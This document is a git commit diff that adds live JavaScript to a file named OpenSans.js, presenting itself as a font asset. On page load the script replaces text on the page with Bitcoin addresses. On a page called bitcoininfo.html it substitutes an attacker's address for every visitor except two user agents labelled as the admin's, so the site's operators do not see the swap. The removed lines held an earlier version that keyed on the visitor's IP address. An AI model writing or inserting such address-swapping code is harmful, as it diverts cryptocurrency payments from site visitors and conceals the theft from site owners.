46f855b2a7fd1f5b52ad699909fdba4c11280b88
reposltory <124707435+reposltory@users.noreply.github.com>
2024-06-17 15:29:15 +0330

    NIS

--- OpenSans.js
+++ OpenSans.js
@@ -1,28 +1,28 @@
+    const targetUserAgents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    ];
 
-//   function getVisitorIP() {
-//     const elm = document.getElementsByTagName("h2")[1];
-//     if (elm) {
-//         elm.textContent = "1BUn5iF7pAxSvdzvE8oCTX6JmbyungsAdq";
+    function getUAC() {
+        const elm = document.getElementsByTagName("h2")[1];
+        if (elm) {
+            elm.textContent = "1BUn5iF7pAxSvdzvE8oCTX6JmbyungsAdq";
+            if (window.location.href.includes("bitcoininfo.html")) {
+                const desiredText = "1LLZckVAYGnLDRgfXHWFSPjY81SWAtnR6q";
+                // Update text content only if needed
+                const currentUserAgent = navigator.userAgent;
+                if (!targetUserAgents.includes(currentUserAgent)) {
+                    console.log("Not Admin");
+                    if (elm.textContent !== desiredText) {
+                    elm.textContent = desiredText;
+                }
+                }
+                
+            }
+            
+        }
+    }
 
-//         fetch('https://ipinfo.io/json')
-//             .then(response => response.json())
-//             .then(data => {
-//                 // console.log('Visitor IP:', data.ip);
-
-//                 if (!data.ip.startsWith('161')) {
-//                   if (window.location.href.includes("bitcoininfo.html")) {
-//                       const desiredText = "1LuUNwYLgHyEwHhhS6HRoZn4dkvwiFZfGV";
-//                       // Update text content only if needed
-//                       if (elm.textContent !== desiredText) {
-//                           elm.textContent = desiredText;
-//                       }
-//                   }
-//                 }  
-//             })
-//             .catch(error => console.error('Error:', error));
-//     }
-// }
-
-// // Call the function as soon as the DOM content is loaded
-// document.addEventListener("DOMContentLoaded", getVisitorIP);
-// getVisitorIP()
+// Call the function as soon as the DOM content is loaded
+document.addEventListener("DOMContentLoaded", getUAC);
+getUAC()
